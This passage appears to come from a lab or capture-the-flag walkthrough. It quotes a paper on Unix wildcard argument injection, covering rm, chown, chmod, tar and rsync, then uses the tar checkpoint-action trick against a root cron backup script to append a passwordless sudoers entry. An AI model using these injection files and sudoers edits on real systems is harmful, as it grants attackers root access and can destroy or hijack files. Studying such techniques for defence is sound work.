</span><span class='line'>could abuse it with "argument-like-filename". One of them said that he 
</span><span class='line'>heard of that years ago on some basic Linux admin course. Funny.
</span><span class='line'>
</span><span class='line'>Simple trick behind this technique is that when using shell wildcards, 
</span><span class='line'>especially asterisk (*), Unix shell will interpret files beginning with hyphen
</span><span class='line'>(-) character as command line arguments to executed command/program.
</span><span class='line'>That leaves space for variation of classic channeling attack.
</span><span class='line'>Channeling problem will arise when different kind of information channels 
</span><span class='line'>are combined into single channel. Practical case in form of particulary this technique 
</span><span class='line'>is combining arguments and filenames, as different "channels" into single,
</span><span class='line'>because of using shell wildcards.
</span><span class='line'>
</span><span class='line'>Let's check one very basic wildcard argument injection example.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 20
</span><span class='line'>drwxrwxr-x.  5 leon   leon   4096 Oct 28 17:04 .
</span><span class='line'>drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
</span><span class='line'>drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR1
</span><span class='line'>drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR2
</span><span class='line'>drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:04 DIR3
</span><span class='line'>-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file1.txt
</span><span class='line'>-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file2.txt
</span><span class='line'>-rw-rw-r--.  1 leon   leon      0 Oct 28 17:03 file3.txt
</span><span class='line'>-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
</span><span class='line'>
</span><span class='line'>We have directory with few subdirectories and few files in it.
</span><span class='line'>There is also file with '-rf' filename ther owned by the user 'nobody'.
</span><span class='line'>Now, let's run 'rm *' command, and check directory content again.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# rm *
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 8
</span><span class='line'>drwxrwxr-x.  2 leon   leon   4096 Oct 28 17:05 .
</span><span class='line'>drwx------. 22 leon   leon   4096 Oct 28 16:15 ..
</span><span class='line'>-rw-rw-r--.  1 nobody nobody    0 Oct 28 16:38 -rf
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Directory is totally empty, except for '-rf' file in it.
</span><span class='line'>All files and directories were recursively deleted, and it's pretty obvious what happened...
</span><span class='line'>When we started 'rm' command with asterisk argument, all filenames in current
</span><span class='line'>directory were passed as arguments to 'rm' on command line, exactly same as 
</span><span class='line'>following line:
</span><span class='line'>
</span><span class='line'>[user@defensecode WILD]$ rm DIR1 DIR2 DIR3 file1.txt file2.txt file3.txt -rf
</span><span class='line'>
</span><span class='line'>Since there is '-rf' filename in current directory, 'rm' got -rf option as the
</span><span class='line'>last argument, and all files in current directory were recursively deleted.
</span><span class='line'>We can also check that with strace:
</span><span class='line'>
</span><span class='line'>[leon@defensecode WILD]$ strace rm *
</span><span class='line'>execve("/bin/rm", ["rm", "DIR1", "DIR2", "DIR3", "file1.txt", "file2.txt", 
</span><span class='line'>"file3.txt", "-rf"], [/* 25 vars */]) = 0
</span><span class='line'>              ^- HERE
</span><span class='line'>
</span><span class='line'>Now we know how it's possible to inject arbitrary arguments to the unix
</span><span class='line'>shell programs. In the following chapter we will discuss how we can abuse that
</span><span class='line'>feature to do much more than just recursively delete files.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 4. Something more useful...
</span><span class='line'>
</span><span class='line'>Since now we know how it's possible to inject arbitrary arguments to
</span><span class='line'>shell commands, let's demonstrate few examples that are more useful,
</span><span class='line'>than just recursive file unlinking.
</span><span class='line'>First, when I stumbled across this wildcard tricks, I was starting to look
</span><span class='line'>for basic and common Unix programs that could be seriously affected 
</span><span class='line'>with arbitrary and unexpected arguments. 
</span><span class='line'>In real-world cases, following examples could be abused in form of direct
</span><span class='line'>interactive shell poisoning, or through some commands started from cron job,
</span><span class='line'>shell scripts, through some web application, and so on.
</span><span class='line'>In all examples below, attacker is hidden behind 'leon' account, and victim 
</span><span class='line'>is of course - root account.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>==[ 4.1 Chown file reference trick (file owner hijacking)
</span><span class='line'>
</span><span class='line'>First really interesting target I've stumbled across is 'chown'. 
</span><span class='line'>Let's say that we have some publicly writeable directory with bunch of
</span><span class='line'>PHP files in there, and root user wants to change owner of all PHP files to 'nobody'.
</span><span class='line'>Pay attention to the file owners in the following files list.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 52
</span><span class='line'>drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
</span><span class='line'>drwx------. 22 user user 4096 Oct 28 17:34 ..
</span><span class='line'>-rw-rw-r--.  1 user user   66 Oct 28 17:36 admin.php
</span><span class='line'>-rw-rw-r--.  1 user user   34 Oct 28 17:35 ado.php
</span><span class='line'>-rw-rw-r--.  1 user user   80 Oct 28 17:44 config.php
</span><span class='line'>-rw-rw-r--.  1 user user  187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r--.  1 user user  201 Oct 28 17:35 download.php
</span><span class='line'>-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r--.  1 user user   43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r--.  1 user user   56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r--.  1 user user  357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r--.  1 user user  225 Oct 28 17:35 header.php
</span><span class='line'>-rw-rw-r--.  1 user user  117 Oct 28 17:35 inc.php
</span><span class='line'>-rw-rw-r--.  1 user user  111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
</span><span class='line'>-rw-rw----.  1 user user   66 Oct 28 17:35 password.inc.php
</span><span class='line'>-rw-rw-r--.  1 user user   94 Oct 28 17:35 script.php
</span><span class='line'>
</span><span class='line'>Files in this public directory are mostly owned by the user named 'user', 
</span><span class='line'>and root user will now change that to 'nobody'.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# chown -R nobody:nobody *.php
</span><span class='line'>
</span><span class='line'>Let's see who owns files now...
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 52
</span><span class='line'>drwxrwxrwx.  2 user user 4096 Oct 28 17:47 .
</span><span class='line'>drwx------. 22 user user 4096 Oct 28 17:34 ..
</span><span class='line'>-rw-rw-r--.  1 leon leon   66 Oct 28 17:36 admin.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   34 Oct 28 17:35 ado.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   80 Oct 28 17:44 config.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  201 Oct 28 17:35 download.php
</span><span class='line'>-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  225 Oct 28 17:35 header.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  117 Oct 28 17:35 inc.php
</span><span class='line'>-rw-rw-r--.  1 leon leon  111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
</span><span class='line'>-rw-rw----.  1 leon leon   66 Oct 28 17:35 password.inc.php
</span><span class='line'>-rw-rw-r--.  1 leon leon   94 Oct 28 17:35 script.php
</span><span class='line'>
</span><span class='line'>Something is not right... What happened? Somebody got drunk here.
</span><span class='line'>Superuser tried to change files owner to the user:group 'nobody', but somehow, 
</span><span class='line'>all files are owned by the user 'leon' now.
</span><span class='line'>
</span><span class='line'>If we take closer look, this directory previously contained just the 
</span><span class='line'>following two files created and owned by the user 'leon'.
</span><span class='line'>
</span><span class='line'>-rw-r--r--.  1 leon leon    0 Oct 28 17:40 .drf.php
</span><span class='line'>-rw-rw-r--.  1 leon leon    0 Oct 28 17:45 --reference=.drf.php
</span><span class='line'>
</span><span class='line'>Thing is that wildcard character used in 'chown' command line took arbitrary 
</span><span class='line'>'--reference=.drf.php' file and passed it to the chown command at
</span><span class='line'>the command line as an option.
</span><span class='line'>
</span><span class='line'>Let's check chown manual page (man chown):
</span><span class='line'>   --reference=RFILE
</span><span class='line'>          use RFILE's owner and group rather than specifying OWNER:GROUP values
</span><span class='line'>
</span><span class='line'>So in this case, '--reference' option to 'chown' will override 'nobody:nobody'
</span><span class='line'>specified as the root, and new owner of files in this directory will be exactly
</span><span class='line'>same as the owner of '.drf.php', which is in this case user 'leon'.
</span><span class='line'>Just for the record, '.drf' is short for Dummy Reference File. :)
</span><span class='line'>
</span><span class='line'>To conclude, reference option can be abused to change ownership of files to some 
</span><span class='line'>arbitrary user. If we set some other file as argument to the --reference option,
</span><span class='line'>file that's owned by some other user, not 'leon', in that case he would become owner 
</span><span class='line'>of all files in this directory.
</span><span class='line'>
</span><span class='line'>With this simple chown parameter pollution, we can trick root into changing ownership 
</span><span class='line'>of files to arbitrary users, and practically "hijack" files that are of interest to us.
</span><span class='line'>
</span><span class='line'>Even more, if user 'leon' previously created a symbolic link in that directory 
</span><span class='line'>that points to let's say /etc/shadow, ownership of /etc/shadow would also be changed 
</span><span class='line'>to the user 'leon'.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 4.2 Chmod file reference trick
</span><span class='line'>
</span><span class='line'>Another interesting attack vector similar to previously described 'chown' 
</span><span class='line'>attack is 'chmod'.
</span><span class='line'>Chmod also has --reference option that can be abused to specify arbitrary 
</span><span class='line'>permissions on files selected with asterisk wildcard.
</span><span class='line'>
</span><span class='line'>Chmod manual page (man chmod):
</span><span class='line'>       --reference=RFILE
</span><span class='line'>              use RFILE's mode instead of MODE values
</span><span class='line'>
</span><span class='line'>Example is presented below.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 68
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
</span><span class='line'>-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
</span><span class='line'>-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>
</span><span class='line'>Superuser will now try to set mode 000 on all files.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# chmod 000 *
</span><span class='line'>
</span><span class='line'>Let's check permissions on files...
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 68
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 29 00:41 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxrwxrwx.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxrwxrwx.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxrwxrwx.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxrwxrwx.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rwxrwxrwx.  1 leon leon     0 Oct 29 00:40 .drf.php
</span><span class='line'>-rwxrwxrwx.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxrwxrwx.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxrwxrwx.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxrwxrwx.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxrwxrwx.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxrwxrwx.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 29 00:41 --reference=.drf.php
</span><span class='line'>-rwxrwxrwx.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>
</span><span class='line'>What happened? Instead of 000, all files are now set to mode 777 because
</span><span class='line'>of the '--reference' option supplied through file name..
</span><span class='line'>Once again, file .drf.php owned by user 'leon' with mode 777 was 
</span><span class='line'>used as reference file and since --reference option is supplied, all files
</span><span class='line'>will be set to mode 777.
</span><span class='line'>Beside just --reference option, attacker can also create another file with 
</span><span class='line'>'-R' filename, to change file permissions on files in all subdirectories recursively.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 4.3 Tar arbitrary command execution 
</span><span class='line'>
</span><span class='line'>Previous example is nice example of file ownership hijacking. Now, let's go to even 
</span><span class='line'>more interesting stuff like arbitrary command execution. Tar is very common unix program 
</span><span class='line'>for creating and extracting archives.
</span><span class='line'>Common usage for lets say creating archives is:
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# tar cvvf archive.tar *
</span><span class='line'>
</span><span class='line'>So, what's the problem with 'tar'? 
</span><span class='line'>Thing is that tar has many options, and among them, there some pretty interesting
</span><span class='line'>options from arbitrary parameter injection point of view.
</span><span class='line'>
</span><span class='line'>Let's check tar manual page (man tar):
</span><span class='line'>
</span><span class='line'>      --checkpoint[=NUMBER]
</span><span class='line'>              display progress messages every NUMBERth record (default 10)
</span><span class='line'>
</span><span class='line'>       --checkpoint-action=ACTION
</span><span class='line'>              execute ACTION on each checkpoint
</span><span class='line'>
</span><span class='line'>There is '--checkpoint-action' option, that will specify program which will
</span><span class='line'>be executed when checkpoint is reached. Basically, that allows us arbitrary
</span><span class='line'>command execution.
</span><span class='line'>
</span><span class='line'>Check the following directory:
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 72
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Oct 28 19:34 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rw-rw-r--.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rw-rw-r--.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rw-rw-r--.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rw-rw-r--.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-rw-r--.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rw-rw-r--.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rw-rw-r--.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rw-rw-r--.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rw-rw-r--.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rw-rw-r--.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rw-rw-r--.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
</span><span class='line'>
</span><span class='line'>Now, for example, root user wants to create archive of all files in current 
</span><span class='line'>directory.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# tar cf archive.tar *
</span><span class='line'>
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>
</span><span class='line'>Boom! What happened? /usr/bin/id command gets executed! We've just achieved arbitrary command
</span><span class='line'>execution under root privileges.
</span><span class='line'>Once again, there are few files created by user 'leon'. 
</span><span class='line'>
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 28 19:19 --checkpoint=1
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Oct 28 19:17 --checkpoint-action=exec=sh shell.sh
</span><span class='line'>-rwxr-xr-x.  1 leon leon    12 Oct 28 19:17 shell.sh
</span><span class='line'>
</span><span class='line'>Options '--checkpoint=1' and '--checkpoint-action=exec=sh shell.sh' are passed to the 
</span><span class='line'>'tar' program as command line options. Basically, they command tar to execute shell.sh
</span><span class='line'>shell script upon the execution.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# cat shell.sh
</span><span class='line'>/usr/bin/id
</span><span class='line'>
</span><span class='line'>So, with this tar argument pollution, we can basically execute arbitrary commands 
</span><span class='line'>with privileges of the user that runs tar. As demonstrated on the 'root' account above.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 4.4 Rsync arbitrary command execution
</span><span class='line'>
</span><span class='line'>Rsync is "a fast, versatile, remote (and local) file-copying tool", that is very
</span><span class='line'>common on Unix systems.
</span><span class='line'>If we check 'rsync' manual page, we can again find options that can be abused for arbitrary 
</span><span class='line'>command execution.
</span><span class='line'>
</span><span class='line'>Rsync manual:
</span><span class='line'>"You use rsync in the same way you use rcp. You must specify a source and a destination, 
</span><span class='line'>one of which may be remote."
</span><span class='line'>
</span><span class='line'>Interesting rsync option from manual:
</span><span class='line'>
</span><span class='line'> -e, --rsh=COMMAND           specify the remote shell to use
</span><span class='line'>     --rsync-path=PROGRAM    specify the rsync to run on remote machine
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>Let's abuse one example directly from the 'rsync' manual page.
</span><span class='line'>Following example will copy all C files in local directory to a remote host 'foo' 
</span><span class='line'>in '/src' directory.
</span><span class='line'># rsync -t *.c foo:src/
</span><span class='line'>
</span><span class='line'>Directory content:
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 72
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Mar 28 04:47 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
</span><span class='line'>
</span><span class='line'>Now root will try to copy all C files to the remote server.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# rsync -t *.c foo:src/
</span><span class='line'>
</span><span class='line'>rsync: connection unexpectedly closed (0 bytes received so far) [sender]
</span><span class='line'>rsync error: error in rsync protocol data stream (code 12) at io.c(601) [sender=3.0.8]
</span><span class='line'>
</span><span class='line'>Let's see what happened...
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# ls -al
</span><span class='line'>total 76
</span><span class='line'>drwxrwxrwx.  2 user user  4096 Mar 28 04:49 .
</span><span class='line'>drwx------. 24 user user  4096 Oct 28 18:32 ..
</span><span class='line'>-rwxr-xr-x.  1 user user 20480 Oct 28 19:13 admin.php
</span><span class='line'>-rwxr-xr-x.  1 user user    34 Oct 28 17:47 ado.php
</span><span class='line'>-rwxr-xr-x.  1 user user   187 Oct 28 17:44 db.php
</span><span class='line'>-rwxr-xr-x.  1 user user   201 Oct 28 17:43 download.php
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 user user    43 Oct 28 17:35 file1.php
</span><span class='line'>-rwxr-xr-x.  1 user user    56 Oct 28 17:47 footer.php
</span><span class='line'>-rwxr-xr-x.  1 user user   357 Oct 28 17:36 global.php
</span><span class='line'>-rwxr-xr-x.  1 user user   225 Oct 28 17:37 header.php
</span><span class='line'>-rwxr-xr-x.  1 user user   117 Oct 28 17:36 inc.php
</span><span class='line'>-rwxr-xr-x.  1 user user   111 Oct 28 17:38 index.php
</span><span class='line'>-rwxr-xr-x.  1 user user    94 Oct 28 17:38 script.php
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
</span><span class='line'>-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
</span><span class='line'>
</span><span class='line'>There were two files owned by user 'leon', as listed below.
</span><span class='line'>
</span><span class='line'>-rw-r--r--.  1 leon leon     0 Mar 28 04:45 -e sh shell.c
</span><span class='line'>-rwxr-xr-x.  1 leon leon    31 Mar 28 04:45 shell.c
</span><span class='line'>
</span><span class='line'>After 'rsync' execution, new file shell_output.txt whose owner is root 
</span><span class='line'>is created in same directory.
</span><span class='line'>
</span><span class='line'>-rw-r--r--.  1 root root   101 Mar 28 04:49 shell_output.txt
</span><span class='line'>
</span><span class='line'>If we check its content, following data is found.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# cat shell_output.txt
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
</span><span class='line'>
</span><span class='line'>Trick is that because of the '*.c' wildcard, 'rsync' got '-e sh shell.c' option
</span><span class='line'>on command line, and shell.c will be executed upon 'rsync' start.
</span><span class='line'>Content of shell.c is presented below.
</span><span class='line'>
</span><span class='line'>[root@defensecode public]# cat shell.c
</span><span class='line'>/usr/bin/id &gt; shell_output.txt
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>===[ 5. Conclusion
</span><span class='line'>
</span><span class='line'>Techniques discussed in article can be applied in different forms on various popular 
</span><span class='line'>Unix tools. In real-world attacks, arbitrary shell options/arguments could be hidden 
</span><span class='line'>among regular files, and not so easily spotted by administrator. Moreover, in case of 
</span><span class='line'>cron jobs, shell scripts or web applications that calls shell commands, that's not 
</span><span class='line'>even important. Moreover, there are probably much more popular Unix tools susceptible 
</span><span class='line'>to previously described wildcard attacks.
</span><span class='line'>Thanks to Hrvoje Spoljar and Sec-Consult for a few ideas regarding this document.</span></code></pre></td></tr></table></div></figure>


<p>This entertaining and useful read will probably come in handy next! I looked around some more, and saw a backup folder inside the / directory:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls
</span><span class='line'>backup.sh
</span><span class='line'>backup.tgz
</span><span class='line'>$ cat backup.sh
</span><span class='line'>#!/bin/bash
</span><span class='line'>cd /var/www/html
</span><span class='line'>tar cf /backup/backup.tgz *</span></code></pre></td></tr></table></div></figure>


<p>This backup script creates an archive of all files inside /var/www/html. And it&rsquo;s owned by root. After reading that section about tar command execution, this is a big sign of the next steps to take in achieving root. So I needed to find out if this backup shell script is being used by anything. I grepped for a mention of the script in the files present on the filesystem:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -r "backup.sh" 2&gt;/dev/null</span></code></pre></td></tr></table></div></figure>


<p>And an interesting entry popped up:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>etc/crontab:*/1 *    * * *   root    /backup/backup.sh</span></code></pre></td></tr></table></div></figure>


<p>The backup script is run every minute by cron. Now review the tar command execution section before proceeding. To run arbitrary code, we have to create 3 files inside the directory where tar is run, which in this case is /var/www/html.</p>

<p>Now, remember the checkpoint parameters:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>--checkpoint[=NUMBER]
</span><span class='line'>
</span><span class='line'>    display progress messages every NUMBERth record (default 10)
</span><span class='line'>
</span><span class='line'>--checkpoint-action=ACTION
</span><span class='line'>    execute ACTION on each checkpoint</span></code></pre></td></tr></table></div></figure>


<p>We can use these to inject arbitrary commands. In other words, run the desired command when the checkpoint is reached. To test it out, I created the files as follows:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo "" &gt; --checkpoint=1
</span><span class='line'>echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
</span><span class='line'>echo "/usr/bin/whoami &gt; /tmp/readme" &gt; shell.sh
</span><span class='line'>chmod +x shell.sh</span></code></pre></td></tr></table></div></figure>


<p>And now when tar is run, it will pick up the files I created as parameters:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls
</span><span class='line'>--checkpoint-action=exec=sh shell.sh
</span><span class='line'>--checkpoint=1
</span><span class='line'>bomb.jpg
</span><span class='line'>bomb.php
</span><span class='line'>content.php
</span><span class='line'>index.php
</span><span class='line'>info.php
</span><span class='line'>main.php
</span><span class='line'>mj.jpg
</span><span class='line'>nav.php
</span><span class='line'>props.php
</span><span class='line'>shell.sh</span></code></pre></td></tr></table></div></figure>


<p>I waited for a bit and then:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ls /tmp
</span><span class='line'>readme
</span><span class='line'>systemd-private-b21f86620e1c4dbf8ba8443074d9367f-systemd-timesyncd.service-flEglg
</span><span class='line'>vmware-root
</span><span class='line'>$ cat /tmp/readme
</span><span class='line'>root</span></code></pre></td></tr></table></div></figure>


<p>Awesome! It works! And this is a technique I had no idea about! So now I&rsquo;ve changed the commands to give my low-privilege user full permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo 'echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; shell.sh
</span><span class='line'>$ cat shell.sh
</span><span class='line'>echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers</span></code></pre></td></tr></table></div></figure>


<p>Again, after some waiting, the root powers are here!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
